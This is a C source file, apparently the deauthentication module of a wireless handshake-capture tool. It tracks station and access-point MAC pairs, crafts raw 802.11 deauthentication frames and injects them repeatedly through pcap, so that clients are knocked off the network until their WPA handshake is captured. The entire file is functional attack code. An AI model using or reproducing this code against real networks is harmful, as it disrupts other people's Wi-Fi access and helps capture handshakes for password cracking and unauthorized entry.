#include <assert.h>
#include <fcntl.h>
#include <time.h>
#include <unistd.h>

#include <uthash.h>

#include "handler.h"
#include "handshake.h"
#include "ieee802.h"
#include "killer.h"
#include "params.h"
#include "terminal.h"

struct message {
    zz_mac_addr station;
    zz_mac_addr bssid;
    zz_packet_outcome outcome;
};

struct zz_target {
    zz_mac_addr station;
    zz_mac_addr bssid;
    uint16_t sequence_control;
    time_t schedule;
    unsigned attempts;
    UT_hash_handle hh;
};

static void set_target(zz_handler *zz, zz_killer *killer,
                       const struct zz_target *target) {
    struct zz_target *tmp;

    /* add the target if not present (addresses are tighly packed) */
    HASH_FIND(hh, killer->targets, &target->station, 2 * sizeof(zz_mac_addr), tmp);
    if (tmp == NULL) {
        tmp = malloc(sizeof(struct zz_target));
        assert(tmp != NULL);
        *tmp = *target;
        HASH_ADD(hh, killer->targets, station, 2 * sizeof(zz_mac_addr), tmp);

        /* start with a randomized sequence number */
        tmp->sequence_control = rand();
    }
    /* otherwise just update the schedule (i.e., keep the sequence number) */
    else {
        tmp->schedule = target->schedule;
    }

    /* set max deauthentication attempts */
    tmp->attempts = zz->setup.killer_max_attempts;
}

static void del_target(zz_killer *killer, const struct zz_target *target) {
    struct zz_target *tmp;

    /* lookup the target (addresses are tighly packed) */
    HASH_FIND(hh, killer->targets, &target->station, 2 * sizeof(zz_mac_addr), tmp);
    assert(tmp != NULL);

    /* then delete it */
    HASH_DEL(killer->targets, tmp);
    free(tmp);
}

static int kill_target(zz_handler *zz, struct zz_target *target) {
    int i;

    struct {
        struct ieee80211_radiotap_header radiotap_header;
        struct ieee80211_mac_header mac_header;
        struct ieee80211_deauthentication_header deauthentication_header;
    }
    __attribute__((__packed__)) packet = {{0}, {0}, {0}};

    /* fill the packet fields */
    packet.radiotap_header.length = htole16(sizeof(struct ieee80211_radiotap_header));
    *(uint8_t *)&packet.mac_header = ZZ_FCF_DEAUTHENTICATION;
    zz_mac_addr_to_array(packet.mac_header.address_1, target->station);
    zz_mac_addr_to_array(packet.mac_header.address_2, target->bssid);
    zz_mac_addr_to_array(packet.mac_header.address_3, target->bssid);
    packet.deauthentication_header.reason = ZZ_DEAUTHENTICATION_REASON;

    for (i = 0; i < zz->setup.n_deauths; i++) {
        /* inject packet */
        if (pcap_inject(zz->pcap, &packet, sizeof(packet)) == -1) {
            zz_error(zz, "Cannot inject the deauthentication packet");
            return 0;
        }

        /* increment the sequence number */
        packet.mac_header.sequence_control =
            htole16(ZZ_DEAUTHENTICATION_SEQUENCE(target->sequence_control));
        target->sequence_control++;
    }

    /* schedule the next deauthentication */
    target->schedule += zz->setup.killer_interval;
    return 1;
}

void zz_killer_new(zz_killer *killer) {
    killer->targets = NULL;

    /* create a non-blocking communication pipe */
    assert(pipe(killer->pipe) == 0);
    assert(fcntl(killer->pipe[0], F_SETFL, O_NONBLOCK) == 0);
    assert(fcntl(killer->pipe[1], F_SETFL, O_NONBLOCK) == 0);
}

void zz_killer_post_message(zz_killer *killer,
                            zz_mac_addr station, zz_mac_addr bssid,
                            zz_packet_outcome outcome) {
    struct message message = {0};

    /* prepare */
    message.station = station;
    message.bssid = bssid;
    message.outcome = outcome;

    /* enqueue (assuming no EAGAIN) */
    assert(write(killer->pipe[1], &message,
           sizeof(struct message)) == sizeof(struct message));
}

int zz_killer_run(zz_handler *zz, zz_killer *killer) {
    struct message message;
    struct zz_target *tmp, *iterator;
    time_t now;

    /* first drain the message pipe (assuming no EAGAIN) */
    while (read(killer->pipe[0], &message,
           sizeof(struct message)) == sizeof(struct message)) {
        struct zz_target target = {0};

        /* prepare the target key */
        target.station = message.station;
        target.bssid = message.bssid;

        /* update the target information */
        if (message.outcome.track_client) {
            /* schedule a deauthentication now */
            target.schedule = time(NULL);

            /* delay the next deauthentication message */
            if (message.outcome.grace_time) {
                target.schedule += ZZ_KILLER_GRACE_TIME;
            }

            set_target(zz, killer, &target);
        }
        /* remove a client from the kill list */
        else if (message.outcome.got_handshake) {
            del_target(killer, &target);
        }
    }

    /* then scan the list and perform scheduled deauthentications */
    now = time(NULL);
    HASH_ITER(hh, killer->targets, iterator, tmp) {
        char station_str[ZZ_MAC_ADDR_STRING_SIZE];
        char bssid_str[ZZ_MAC_ADDR_STRING_SIZE];

        /* too early */
        if (iterator->schedule > now) {
            continue;
        }

        /* skip given up targets */
        if (iterator->attempts == 0) {
            continue;
        }

        /* kill! */
        zz_mac_addr_sprint(station_str, iterator->station);
        zz_mac_addr_sprint(bssid_str, iterator->bssid);
        zz_log("Deauthenticating %s @ %s", station_str, bssid_str);
        if (!kill_target(zz, iterator)) {
            return 0;
        }

        /* check given up targets */
        if (--iterator->attempts == 0) {
            zz_log("Giving up with %s @ %s", station_str, bssid_str);
        }
    }

    return 1;
}

void zz_killer_free(zz_killer *killer) {
    struct zz_target *tmp, *target;

    assert(close(killer->pipe[0]) == 0);
    assert(close(killer->pipe[1]) == 0);

    HASH_ITER(hh, killer->targets, target, tmp) {
        HASH_DEL(killer->targets, target);
        free(target);
    }
}
